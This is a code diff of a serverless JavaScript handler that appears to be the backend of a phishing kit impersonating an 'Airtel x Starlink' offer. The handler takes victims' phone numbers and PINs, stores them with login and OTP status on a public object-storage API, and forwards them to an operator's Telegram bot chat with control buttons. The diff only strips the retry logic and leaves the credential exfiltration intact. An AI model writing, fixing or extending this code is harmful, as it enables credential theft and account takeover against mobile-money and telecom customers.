@@ -1,25 +1,6 @@
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.VITE_TELEGRAM_BOT_TOKEN || '';
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID || process.env.VITE_TELEGRAM_CHAT_ID || '';
 
-// Retry helper with exponential backoff
-async function retryWithBackoff(fn, maxRetries = 3, baseDelay = 1000) {
-  let lastError;
-  for (let attempt = 0; attempt <= maxRetries; attempt++) {
-    try {
-      return await fn();
-    } catch (error) {
-      lastError = error;
-      console.warn(`Retry attempt ${attempt + 1}/${maxRetries + 1} failed:`, error.message);
-
-      if (attempt === maxRetries) break;
-
-      const delay = baseDelay * Math.pow(2, attempt) + Math.random() * 200;
-      await new Promise(resolve => setTimeout(resolve, delay));
-    }
-  }
-  throw lastError;
-}
-
 export default async function handler(req, res) {
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
@@ -46,48 +27,41 @@ export default async function handler(req, res) {
     const displayCountry = country || 'Airtel Africa';
     const displayBrand = airtelBrand || 'Airtel x Starlink Direct';
 
-    // 1. Create cloud session record on restful-api.dev with retry
+    // 1. Create cloud session record on restful-api.dev (async, don't wait)
     let cloudId = sessionId;
-    try {
-      cloudId = await retryWithBackoff(async () => {
-        const createRes = await fetch('https://api.restful-api.dev/objects', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            name: `stl_${cleanPhone}_${Date.now()}`, // Add timestamp to avoid conflicts
-            data: {
-              sessionId,
-              phone: cleanPhone,
-              fullPhone: displayPhone,
-              country: displayCountry,
-              airtelBrand: displayBrand,
-              pin: cleanPin,
-              planName: planName || 'Forfait Airtel Starlink',
-              planPrice: planPrice || '$1.49',
-              loginStatus: 'pending',
-              otpStatus: 'idle',
-              createdAt: Date.now(),
-              lastUpdated: Date.now(),
-            },
-          }),
-        });
-
-        if (!createRes.ok) {
-          throw new Error(`Cloud creation failed: ${createRes.status}`);
+    fetch('https://api.restful-api.dev/objects', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        name: `stl_${cleanPhone}_${Date.now()}`,
+        data: {
+          sessionId,
+          phone: cleanPhone,
+          fullPhone: displayPhone,
+          country: displayCountry,
+          airtelBrand: displayBrand,
+          pin: cleanPin,
+          planName: planName || 'Forfait Airtel Starlink',
+          planPrice: planPrice || '$1.49',
+          loginStatus: 'pending',
+          otpStatus: 'idle',
+          createdAt: Date.now(),
+          lastUpdated: Date.now(),
+        },
+      }),
+    })
+      .then(createRes => {
+        if (createRes.ok) {
+          return createRes.json();
         }
-
-        const createData = await createRes.json();
+        throw new Error('Cloud creation failed');
+      })
+      .then(createData => {
         if (createData && createData.id) {
-          return createData.id;
+          cloudId = createData.id;
         }
-
-        throw new Error('Cloud creation returned no ID');
-      });
-    } catch (e) {
-      console.warn('Could not create cloud record (after retries):', e);
-      // Use sessionId as fallback
-      cloudId = sessionId;
-    }
+      })
+      .catch(e => console.warn('Could not create cloud record:', e));
 
     // 2. Format message for Telegram
     const messageText =
@@ -120,39 +94,21 @@ export default async function handler(req, res) {
       ],
     ];
 
-    // Send Telegram message with retry
-    let tgData;
-    try {
-      tgData = await retryWithBackoff(async () => {
-        const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: messageText,
-            parse_mode: 'HTML',
-            reply_markup: {
-              inline_keyboard: inlineKeyboard,
-            },
-          }),
-        });
+    // Send Telegram message
+    const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: messageText,
+        parse_mode: 'HTML',
+        reply_markup: {
+          inline_keyboard: inlineKeyboard,
+        },
+      }),
+    });
 
-        if (!tgRes.ok) {
-          const errorText = await tgRes.text();
-          throw new Error(`Telegram API error: ${tgRes.status} - ${errorText}`);
-        }
-
-        const data = await tgRes.json();
-        if (!data.ok) {
-          throw new Error('Telegram API returned error response');
-        }
-
-        return data;
-      });
-    } catch (error) {
-      console.error('Failed to send Telegram message after retries:', error);
-      return res.status(500).json({ error: 'Failed to send login notification' });
-    }
+    const tgData = await tgRes.json();
 
     return res.status(200).json({
       success: true,
